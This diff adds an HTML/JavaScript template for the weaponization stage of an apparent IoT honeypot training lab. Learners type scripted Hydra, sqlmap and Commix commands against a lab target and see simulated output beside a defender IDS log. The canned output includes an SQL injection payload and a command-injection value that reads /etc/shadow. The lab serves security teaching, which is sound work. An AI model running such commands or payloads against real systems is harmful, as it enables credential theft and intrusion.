@@ -1,0 +1,451 @@
+{% extends "base.html" %}
+{% block title %}Phase 2: Weaponization | IoT Honeypot{% endblock %}
+{% block extra_head %}
+<style>
+    /* Sidebar auto-hide */
+    body.lab-mode > aside { transform: translateX(-100%); position: fixed; z-index: 100; transition: transform 0.3s ease; height: 100vh; box-shadow: 4px 0 20px rgba(0,0,0,0.5); }
+    body.lab-mode > aside.sidebar-visible { transform: translateX(0); }
+    body.lab-mode > main { margin-left: 0 !important; width: 100% !important; }
+    .sidebar-toggle-btn { position: fixed; left: 8px; top: 50%; transform: translateY(-50%); z-index: 90; background: #1e293b; border: 1px solid #475569; color: #94a3b8; padding: 10px 6px; border-radius: 0 8px 8px 0; cursor: pointer; transition: all 0.2s; }
+    .sidebar-toggle-btn:hover { background: #334155; color: white; padding-left: 10px; }
+    body.lab-mode > aside.sidebar-visible ~ main .sidebar-toggle-btn { left: 264px; }
+
+    .mission-layout { display: flex; flex-direction: column; height: 100%; background: #0f172a; color: #e2e8f0; }
+    .phase-bar { background: #1e293b; border-bottom: 1px solid #334155; padding: 8px 16px; }
+    .phase-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .phase-dot.done { background: #22c55e; }
+    .phase-dot.active { background: #f59e0b; box-shadow: 0 0 8px #f59e0b; }
+    .phase-dot.pending { background: #475569; }
+    .phase-connector { width: 40px; height: 2px; }
+    .phase-connector.done { background: #22c55e; }
+    .phase-connector.pending { background: #475569; }
+    .split-panels { flex: 1; display: flex; overflow: hidden; }
+    .panel { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+    .panel-body { flex: 1; overflow-y: auto; }
+    .terminal-bg { background: #0d1117; }
+    .terminal-input { background: transparent; border: none; outline: none; color: #22c55e; font-family: monospace; caret-color: #22c55e; }
+    .prompt { color: #ef4444; }
+    .cmd-output { white-space: pre-wrap; word-break: break-all; font-size: 11px; line-height: 1.5; }
+    .hint-card { background: #1a1a2e; border: 1.5px solid #f59e0b; border-radius: 8px; padding: 12px; }
+    .hint-card code { word-break: break-all; white-space: pre-wrap; display: inline-block; max-width: 100%; }
+    .tab-hint { display: inline-block; background: #334155; color: #94a3b8; font-size: 9px; padding: 1px 6px; border-radius: 3px; font-family: monospace; }
+    .weapon-card { background: #1e293b; border: 2px solid #334155; border-radius: 12px; padding: 16px; cursor: pointer; transition: all 0.2s; }
+    .weapon-card:hover { border-color: #f59e0b; transform: translateY(-2px); }
+    .weapon-card.selected { border-color: #f59e0b; background: rgba(245, 158, 11, 0.1); }
+    .custom-scrollbar::-webkit-scrollbar { width: 5px; }
+    .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); }
+    .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 3px; }
+    @keyframes typeOut { from { max-height: 0; } to { max-height: 600px; } }
+    .type-anim { animation: typeOut 0.5s ease-out; overflow: hidden; }
+</style>
+{% endblock %}
+
+{% block content %}
+<button class="sidebar-toggle-btn" onclick="toggleSidebar()" title="Toggle Sidebar">
+    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+</button>
+<div class="mission-layout">
+    <!-- Phase Progress Bar -->
+    <div class="phase-bar">
+        <div class="flex items-center justify-between">
+            <a href="/lab/mission/recon" class="text-gray-400 hover:text-white text-xs">← Back</a>
+            <div class="flex items-center gap-1">
+                <div class="phase-dot done"></div>
+                <span class="text-xs text-green-400 mx-1">Recon</span>
+                <div class="phase-connector done"></div>
+                <div class="phase-dot active"></div>
+                <span class="text-xs font-bold text-amber-400 mx-1">Weapon</span>
+                <div class="phase-connector pending"></div>
+                <div class="phase-dot pending"></div>
+                <span class="text-xs text-gray-500 mx-1">Exploit</span>
+                <div class="phase-connector pending"></div>
+                <div class="phase-dot pending"></div>
+                <span class="text-xs text-gray-500 mx-1">Success</span>
+            </div>
+            <span class="text-[10px] text-gray-500 font-mono" id="timer">00:00</span>
+        </div>
+    </div>
+
+    <div class="split-panels">
+        <!-- LEFT: Attacker Panel -->
+        <div class="panel border-r border-gray-700">
+            <div class="bg-red-900/30 px-4 py-2 border-b border-red-800/50">
+                <div class="flex items-center gap-2">
+                    <span>⚙️</span>
+                    <div>
+                        <h2 class="font-bold text-red-400 text-sm">WEAPONIZATION</h2>
+                        <p class="text-[10px] text-red-300/60">Choose your attack vector</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel-body custom-scrollbar">
+                <!-- Step A: Weapon Selection (shown first) -->
+                <div id="step-select" class="p-4">
+                    <p class="text-xs text-gray-400 mb-4">Based on your reconnaissance, the target has an HTTP login page on port 80. Select your attack strategy:</p>
+                    
+                    <div class="space-y-3">
+                        <div class="weapon-card" onclick="selectWeapon('brute_force')">
+                            <div class="flex items-center gap-3 mb-2">
+                                <span class="text-2xl">🔑</span>
+                                <div>
+                                    <h4 class="font-bold text-white">Default Credentials</h4>
+                                    <span class="text-[10px] text-orange-400">Tool: Hydra · MITRE T1110</span>
+                                </div>
+                                <span class="ml-auto px-2 py-0.5 bg-orange-500/20 text-orange-400 text-[10px] font-bold rounded">MEDIUM</span>
+                            </div>
+                            <p class="text-xs text-gray-400">Target has a login page. Try common IoT default passwords with a brute-force tool.</p>
+                        </div>
+                        
+                        <div class="weapon-card" onclick="selectWeapon('sqli')">
+                            <div class="flex items-center gap-3 mb-2">
+                                <span class="text-2xl">💉</span>
+                                <div>
+                                    <h4 class="font-bold text-white">SQL Injection</h4>
+                                    <span class="text-[10px] text-red-400">Tool: SQLmap · MITRE T1190</span>
+                                </div>
+                                <span class="ml-auto px-2 py-0.5 bg-red-500/20 text-red-400 text-[10px] font-bold rounded">HIGH</span>
+                            </div>
+                            <p class="text-xs text-gray-400">Login form might have unsanitized inputs. Probe with automated SQL injection scanner.</p>
+                        </div>
+                        
+                        <div class="weapon-card" onclick="selectWeapon('cmdi')">
+                            <div class="flex items-center gap-3 mb-2">
+                                <span class="text-2xl">⚡</span>
+                                <div>
+                                    <h4 class="font-bold text-white">Command Injection</h4>
+                                    <span class="text-[10px] text-purple-400">Tool: Commix · MITRE T1059</span>
+                                </div>
+                                <span class="ml-auto px-2 py-0.5 bg-purple-500/20 text-purple-400 text-[10px] font-bold rounded">CRITICAL</span>
+                            </div>
+                            <p class="text-xs text-gray-400">Input fields may pass data to system shell. Test for OS command injection vulnerabilities.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step B: Tool Command Terminal (shown after selection) -->
+                <div id="step-terminal" class="hidden flex flex-col h-full">
+                    <!-- Hint -->
+                    <div class="px-4 py-3 bg-gray-900/80 border-b border-gray-700">
+                        <div class="hint-card">
+                            <div class="text-[10px] font-bold text-amber-400 uppercase mb-1">📋 Launch the Attack Tool</div>
+                            <p id="tool-hint-text" class="text-xs text-gray-300 mb-2"></p>
+                            <div class="flex items-center gap-2">
+                                <span class="text-[10px] text-gray-400">Command:</span>
+                                <code id="tool-hint-cmd" class="text-xs font-mono bg-gray-800 text-green-400 px-2 py-0.5 rounded cursor-pointer hover:bg-gray-700" onclick="copyToolHint()"></code>
+                                <span class="tab-hint">TAB to auto-complete</span>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- Terminal -->
+                    <div class="flex-1 terminal-bg custom-scrollbar p-4 font-mono text-xs overflow-y-auto" id="terminal">
+                        <div class="text-gray-500 mb-2">┌──(kali㉿attacker)-[~]</div>
+                        <div class="flex items-center">
+                            <span class="prompt">└─$ </span>
+                            <input type="text" id="cmd-input" class="terminal-input flex-1 text-sm"
+                                autocomplete="off" spellcheck="false" onkeydown="handleKey(event)">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Launch Button -->
+            <div class="bg-gray-800/80 border-t border-gray-700 p-3 text-center">
+                <button id="btn-launch" disabled
+                    class="px-6 py-2 bg-gray-600 text-gray-400 rounded font-bold text-sm cursor-not-allowed transition-all">
+                    🔒 Select weapon and run tool command
+                </button>
+            </div>
+        </div>
+
+        <!-- RIGHT: Defender Log -->
+        <div class="panel">
+            <div class="bg-blue-900/30 px-4 py-2 border-b border-blue-800/50 flex items-center justify-between">
+                <div class="flex items-center gap-2">
+                    <span>🛡️</span>
+                    <div>
+                        <h2 class="font-bold text-blue-400 text-sm">DEFENDER VIEW</h2>
+                        <p class="text-[10px] text-blue-300/60">Honeypot IDS console</p>
+                    </div>
+                </div>
+                <div class="flex items-center gap-1">
+                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                    <span class="text-[10px] text-green-400 font-mono">MONITORING</span>
+                </div>
+            </div>
+            <div class="panel-body terminal-bg custom-scrollbar p-4 font-mono text-[10px] space-y-0.5" id="defender-log">
+                <div class="text-gray-500">[SYS] IDS monitoring active</div>
+                <div class="text-yellow-400">[ALERT] Previous recon activity logged</div>
+                <div class="text-green-400">[READY] Watching for exploitation attempts...</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.body.classList.add('lab-mode');
+    let sidebarVisible = false;
+    function toggleSidebar() {
+        const s = document.querySelector('body > aside');
+        sidebarVisible = !sidebarVisible;
+        s.classList.toggle('sidebar-visible', sidebarVisible);
+    }
+
+    const TARGET = '{{ target_ip }}';
+    let selectedWeapon = null;
+    let toolExecuted = false;
+    
+    // Timer from mission start
+    const missionStart = parseInt(sessionStorage.getItem('mission_start') || Date.now().toString());
+    setInterval(() => {
+        const s = Math.floor((Date.now() - missionStart) / 1000);
+        document.getElementById('timer').textContent =
+            String(Math.floor(s/60)).padStart(2,'0') + ':' + String(s%60).padStart(2,'0');
+    }, 1000);
+
+    // ===== TOOL DEFINITIONS =====
+    const TOOLS = {
+        brute_force: {
+            full: `hydra -l admin -P rockyou.txt ${TARGET} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`,
+            tabs: [
+                `hydra`,
+                `hydra -l admin`,
+                `hydra -l admin -P rockyou.txt`,
+                `hydra -l admin -P rockyou.txt ${TARGET}`,
+                `hydra -l admin -P rockyou.txt ${TARGET} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`
+            ],
+            hint: `Launch a dictionary attack against the login page using the 'admin' username and the rockyou wordlist.`,
+            output: [
+                `Hydra v9.5 (c) 2023 by van Hauser - https://github.com/vanhauser-thc/thc-hydra`,
+                `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries`,
+                `[DATA] attacking http-post-form://${TARGET}:80/login`,
+                `[STATUS] 128/14344399 tried, 0 found, 16 running`,
+                `[STATUS] 256/14344399 tried, 0 found, 16 running`,
+                `\x1b[33m[80][http-post-form] host: ${TARGET}   login: admin   password: admin123\x1b[0m`,
+                ``,
+                `\x1b[32m1 valid password found!\x1b[0m`,
+                `[STATUS] attack finished for ${TARGET}`
+            ],
+            defender_logs: [
+                { t: '[ALERT] Rapid POST requests to /login detected!', c: 'text-red-400' },
+                { t: '[DET] Brute Force - 256 login attempts in 4s', c: 'text-orange-400' },
+                { t: '[MITRE] T1110 - Password Guessing', c: 'text-purple-400' },
+                { t: '[INTEL] Attacker using Hydra automated tool', c: 'text-yellow-400' },
+                { t: '[WARN] Valid credential may have been found', c: 'text-red-400' },
+            ]
+        },
+        sqli: {
+            full: `sqlmap -u "http://${TARGET}/login" --forms --dbs --batch`,
+            tabs: [
+                `sqlmap`,
+                `sqlmap -u "http://${TARGET}/login"`,
+                `sqlmap -u "http://${TARGET}/login" --forms`,
+                `sqlmap -u "http://${TARGET}/login" --forms --dbs --batch`
+            ],
+            hint: `Run SQLmap against the login form to test for SQL injection vulnerabilities and enumerate databases.`,
+            output: [
+                `        ___`,
+                `       __H__`,
+                ` ___ ___["]_____ ___ ___  {1.8.2#stable}`,
+                `|_ -| . [']     | .'| . |`,
+                `|___|_  [(]_|_|_|__,|  _|`,
+                `      |_|V...       |_|`,
+                ``,
+                `[*] starting @ 14:35:22`,
+                `[*] testing connection to the target URL`,
+                `[*] testing forms on http://${TARGET}/login`,
+                `[*] testing 'username' parameter`,
+                `\x1b[32m[+] parameter 'username' is INJECTABLE!\x1b[0m`,
+                `    Type: boolean-based blind`,
+                `    Payload (username field): ' OR '1'='1`,
+                `    Payload (password field): (empty)`,
+                ``,
+                `\x1b[32m[+] SQL injection vulnerability confirmed\x1b[0m`,
+                `[*] back-end DBMS: SQLite`,
+                `[*] available databases: iot_admin`
+            ],
+            defender_logs: [
+                { t: '[ALERT] SQL injection probes detected on /login!', c: 'text-red-400' },
+                { t: '[DET] SQLi payload in username field', c: 'text-orange-400' },
+                { t: '[MITRE] T1190 - Exploit Public-Facing Application', c: 'text-purple-400' },
+                { t: '[INTEL] Attacker using SQLmap automated scanner', c: 'text-yellow-400' },
+                { t: '[WARN] Database schema may be exposed', c: 'text-red-400' },
+            ]
+        },
+        cmdi: {
+            full: `commix -u "http://${TARGET}/login" --data="username=admin&password=test" --batch`,
+            tabs: [
+                `commix`,
+                `commix -u "http://${TARGET}/login"`,
+                `commix -u "http://${TARGET}/login" --data="username=admin&password=test"`,
+                `commix -u "http://${TARGET}/login" --data="username=admin&password=test" --batch`
+            ],
+            hint: `Run Commix against the login form to test if input fields pass data to system shell commands.`,
+            output: [
+                `                                     __`,
+                `   ___    ___     ___ ___     ___ ___|__|__  __`,
+                `  |  _|  | . |  |   |   |   |   |   |  |  \\/  |`,
+                `  |___|  |___|  |_|_|_|_|   |_|_|_|_|__|__/\\__|`,
+                `  v3.9 (@commaborern)`,
+                ``,
+                `[*] Testing connection to target...`,
+                `[*] Testing parameter 'password'`,
+                `[*] Trying shell command injection via semicolon...`,
+                `\x1b[32m[+] The parameter 'password' is INJECTABLE!\x1b[0m`,
+                `    Technique: results-based command injection`,
+                `    Payload (username field): admin`,
+                `    Payload (password field): ; cat /etc/shadow`,
+                ``,
+                `\x1b[32m[+] Command injection vulnerability confirmed\x1b[0m`,
+                `[*] Target OS: Linux 4.14`
+            ],
+            defender_logs: [
+                { t: '[ALERT] Command injection probes detected!', c: 'text-red-400' },
+                { t: '[DET] Shell metacharacters in password field', c: 'text-orange-400' },
+                { t: '[MITRE] T1059 - Command Interpreter', c: 'text-purple-400' },
+                { t: '[INTEL] Attacker using Commix automated tool', c: 'text-yellow-400' },
+                { t: '[WARN] OS command execution may be possible', c: 'text-red-400' },
+            ]
+        }
+    };
+
+    // ===== WEAPON SELECTION =====
+    function selectWeapon(type) {
+        selectedWeapon = type;
+        sessionStorage.setItem('mission_attack_type', type);
+        
+        // Highlight selected card
+        document.querySelectorAll('.weapon-card').forEach(c => c.classList.remove('selected'));
+        event.currentTarget.closest('.weapon-card').classList.add('selected');
+        
+        // Log to defender
+        logDefender([
+            { t: `[INTEL] Attacker selected ${type.replace('_', ' ')} attack vector`, c: 'text-yellow-400' },
+            { t: '[ALERT] Weaponization phase detected', c: 'text-orange-400' },
+        ]);
+        
+        // Show terminal after brief delay
+        setTimeout(() => {
+            document.getElementById('step-select').classList.add('hidden');
+            document.getElementById('step-terminal').classList.remove('hidden');
+            
+            const tool = TOOLS[type];
+            document.getElementById('tool-hint-text').textContent = tool.hint;
+            document.getElementById('tool-hint-cmd').textContent = tool.full;
+            
+            setTimeout(() => document.getElementById('cmd-input')?.focus(), 100);
+        }, 500);
+    }
+
+    // ===== TAB AUTO-COMPLETE =====
+    function handleKey(e) {
+        if (e.key === 'Tab') {
+            e.preventDefault();
+            const input = document.getElementById('cmd-input');
+            const tool = TOOLS[selectedWeapon];
+            if (!tool) return;
+            
+            const val = input.value.trim();
+            for (let i = 0; i < tool.tabs.length; i++) {
+                if (tool.tabs[i].length > val.length && tool.tabs[i].startsWith(val.substring(0, Math.max(val.length, 2)))) {
+                    input.value = tool.tabs[i];
+                    return;
+                }
+            }
+            input.value = tool.full;
+        }
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            executeToolCommand();
+        }
+    }
+
+    function executeToolCommand() {
+        const input = document.getElementById('cmd-input');
+        const typed = input.value.trim();
+        if (!typed || !selectedWeapon) return;
+        
+        const terminal = document.getElementById('terminal');
+        const tool = TOOLS[selectedWeapon];
+        const inputLine = input.parentElement;
+        const promptLine = inputLine.previousElementSibling;
+        
+        // Show typed command
+        const cmdLine = document.createElement('div');
+        cmdLine.innerHTML = `<span class="prompt">└─$ </span><span class="text-green-400">${escH(typed)}</span>`;
+        terminal.insertBefore(cmdLine, promptLine);
+        promptLine.remove();
+        
+        if (typed === tool.full) {
+            // Correct — show tool output
+            const outputDiv = document.createElement('div');
+            outputDiv.className = 'cmd-output text-gray-300 my-2 type-anim';
+            outputDiv.innerHTML = tool.output.map(line =>
+                line.replace(/\x1b\[32m/g, '<span class="text-green-400 font-bold">')
+                    .replace(/\x1b\[33m/g, '<span class="text-yellow-400">')
+                    .replace(/\x1b\[0m/g, '</span>')
+            ).join('\n');
+            terminal.insertBefore(outputDiv, inputLine);
+            
+            logDefender(tool.defender_logs);
+            toolExecuted = true;
+            
+            // Enable launch button
+            const btn = document.getElementById('btn-launch');
+            btn.disabled = false;
+            btn.className = 'px-6 py-2 bg-gradient-to-r from-red-500 to-orange-500 text-white rounded font-bold text-sm hover:from-red-400 hover:to-orange-400 transition-all shadow-lg cursor-pointer';
+            btn.textContent = '💥 Launch Exploitation Phase';
+            btn.onclick = () => {
+                window.location.href = `/lab/${selectedWeapon}?mission=true`;
+            };
+        } else {
+            const errDiv = document.createElement('div');
+            const firstWord = typed.split(' ')[0];
+            if (['hydra','sqlmap','commix'].includes(firstWord)) {
+                errDiv.className = 'text-red-400 my-1';
+                errDiv.textContent = `${firstWord}: error - invalid arguments. Check the hint above.`;
+            } else {
+                errDiv.className = 'text-red-400 my-1';
+                errDiv.textContent = `bash: ${firstWord}: command not found`;
+            }
+            terminal.insertBefore(errDiv, inputLine);
+        }
+        
+        const newPrompt = document.createElement('div');
+        newPrompt.className = 'text-gray-500 mt-2';
+        newPrompt.textContent = '┌──(kali㉿attacker)-[~]';
+        terminal.insertBefore(newPrompt, inputLine);
+        
+        input.value = '';
+        inputLine.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function copyToolHint() {
+        const cmd = document.getElementById('tool-hint-cmd').textContent;
+        if (cmd) {
+            document.getElementById('cmd-input').value = cmd;
+            document.getElementById('cmd-input').focus();
+        }
+    }
+
+    function logDefender(logs) {
+        const c = document.getElementById('defender-log');
+        const t = new Date().toLocaleTimeString();
+        const sep = document.createElement('div');
+        sep.className = 'text-gray-600 mt-2';
+        sep.textContent = `[${t}] ─────────────────────`;
+        c.appendChild(sep);
+        logs.forEach((log, i) => {
+            setTimeout(() => {
+                const d = document.createElement('div');
+                d.className = log.c;
+                d.textContent = log.t;
+                c.appendChild(d);
+                d.scrollIntoView({ behavior: 'smooth' });
+            }, (i + 1) * 150);
+        });
+    }
+
+    function escH(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
+</script>
+{% endblock %}
